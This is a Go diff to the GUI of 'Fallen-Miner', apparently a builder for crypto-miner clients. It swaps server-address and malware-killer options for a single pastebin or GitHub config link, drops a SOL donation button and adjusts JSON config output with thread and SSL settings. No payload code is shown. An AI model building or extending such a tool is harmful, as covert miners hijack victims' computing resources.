@@ -43,42 +43,16 @@ func main() {
 	image.Resize(fyne.NewSize(250, 250))
 
 	serverAddressEntry := widget.NewEntry()
-	serverAddressEntry.SetPlaceHolder("Enter Server addresses formatted with commas (eg domain1.com,domain2.com)")
-	servercheck := widget.NewCheck("Build Server?", func(bool) {})
-	malwarecheck := widget.NewCheck("Enable Malware killer?", func(bool) {})
+	serverAddressEntry.SetPlaceHolder("Enter pastebin or gituhb direct link (only 1 supported currently.)")
 
 	tab1Content := container.NewVBox(
 		widget.NewLabel("Builder"),
 		serverAddressEntry,
-		servercheck,
-		malwarecheck,
-
-		widget.NewButton("Check Requirements", func() {
-			supported := isGoVersionSupported() || isGCCInstalled()
-			if supported {
-				dialog.ShowInformation("Requirements", "Requirements are met!", FallenWindow)
-			} else {
-				dialog.ShowInformation("Requirements", "Requirements are not met. You are either using a version of go below 1.18, or do not have GCC installed.", FallenWindow)
-			}
-
-		}),
 
 		widget.NewButton("Build", func() {
 			serverAddress := serverAddressEntry.Text
 			if serverAddress != "" {
-				if servercheck.Checked {
-					if malwarecheck.Checked {
-						buildall(serverAddress, true, true, FallenWindow)
-					} else {
-						buildall(serverAddress, true, false, FallenWindow)
-					}
-				} else {
-					if malwarecheck.Checked {
-						buildall(serverAddress, false, true, FallenWindow)
-					} else {
-						buildall(serverAddress, false, false, FallenWindow)
-					}
-				}
+				buildclient(serverAddress, FallenWindow)
 			} else {
 				dialog.ShowInformation("Error", "Please enter a server address.", FallenWindow)
 			}
@@ -106,11 +80,6 @@ func main() {
 		clipboard.SetContent("ltc1qw7stjsqayppp726jgjwp2362djw7jplqzj2r0c")
 	})
 
-	SOLbutton := widget.NewButton("SOL - Click to copy to clipboard", func() {
-		clipboard := FallenWindow.Clipboard()
-		clipboard.SetContent("F1EtBxf4sPhUsfPdA2jVFfqJ7eLbbkxx4f2ujVhuPrxT")
-	})
-
 	githuburl, _ := url.Parse("https://github.com/laprosa/Fallen-Miner")
 
 	githubLink := widget.NewHyperlink("Created by Incog, you should of downloaded this from my github", githuburl)
@@ -124,7 +93,6 @@ func main() {
 		XMRbutton,
 		BTCbutton,
 		LTCbutton,
-		SOLbutton,
 	)
 
 	textContainer = container.NewCenter(textContainer)
@@ -156,7 +124,6 @@ func main() {
 	sslEntry.SetPlaceHolder("Enter SSL (0 or 1)...")
 
 	createJSONButton := widget.NewButton("Create JSON", func() {
-
 		idleThreads, err := strconv.Atoi(idleThreadsEntry.Text)
 		if err != nil {
 			dialog.ShowError(fmt.Errorf("invalid idle threads: %v", err), FallenWindow)
@@ -191,9 +158,7 @@ func main() {
 			"ssl":          ssl,
 		}
 
-		jsonArray := []map[string]interface{}{data}
-
-		jsonData, err := json.MarshalIndent(jsonArray, "", "  ")
+		jsonData, err := json.MarshalIndent(data, "", "  ")
 		if err != nil {
 			dialog.ShowError(fmt.Errorf("failed to create JSON: %v", err), FallenWindow)
 			return
